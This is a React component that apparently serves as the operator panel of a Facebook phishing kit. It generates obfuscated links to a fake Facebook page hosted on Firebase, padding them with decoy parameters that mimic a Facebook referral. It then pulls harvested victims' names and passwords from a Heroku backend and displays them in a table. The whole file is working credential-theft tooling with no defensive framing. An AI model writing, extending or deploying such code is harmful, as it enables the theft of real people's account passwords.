import React, { useEffect, useState } from "react";
import PhishData from './PhishData'
const HackedDetail = ({keyValue}) => {
  const [link, setLink] = useState("");
  const [userKey, setUserKey] = useState("");
  const [phishData, setPhishData] = useState([]);
  
  useEffect(() => {
    fetch("https://ancient-garden-81797.herokuapp.com/userList", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ key: keyValue}),
    })
      .then((response) => response.json())
      .then((result) => {
        setUserKey(result);
      });
  },[keyValue]);


  const handelLink = (id) => {
    const yourID = id;

    const split = yourID.split('');

    const split1 = Math.round(split.length/2)

    let fakeId ='';
    let fakeId2 = '&&query=24798dak+ded&&refer+facebook&&redirect=jkl';

    for (let i = 0; i < split1; i++) {
        const element = split[i];
        fakeId += element
    }

    for (let i = split1; i < split.length; i++) {
        const element = split[i];
        fakeId2 +=element
    }

    const splitIdForFinal = fakeId+fakeId2;

    const finalLink = `https://phishing-3ea7d.web.app/facebook?id=${splitIdForFinal}`;
    setLink(finalLink);
  };

  useEffect(() => {
    fetch('https://ancient-garden-81797.herokuapp.com/phishedData',{
        method:'POST',
        headers: {
            'Content-Type':'application/json'
        },
        body: JSON.stringify({ key: keyValue})
    })
    .then(response => response.json())
    .then(data => {
        setPhishData(data);
    })
  },[keyValue])


  return (
    <div className="text-center mt-5">
      <h2>Phish Link List</h2>
      <button onClick={() => handelLink(userKey[0].key)} className="btn btn-danger">
        Generate
      </button>

      <p className="my-2">
        <a href={link}>
          <span>{link}</span>
        </a>
      </p>

    <h3 className="my-3"><span>My Phish Data : <span className="name">{phishData.length}</span></span></h3>

    <table className="table table-dark">
        <thead>
            <tr>
                <th>*</th>
                <th>Name</th>
                <th>Password</th>
            </tr>
        </thead>
        <tbody>
            {
                phishData.map((phish,index) => <PhishData key={phish._id} index={index} phish={phish}></PhishData>)
            }
        </tbody>
    </table>

    </div>
  );
};

export default HackedDetail;
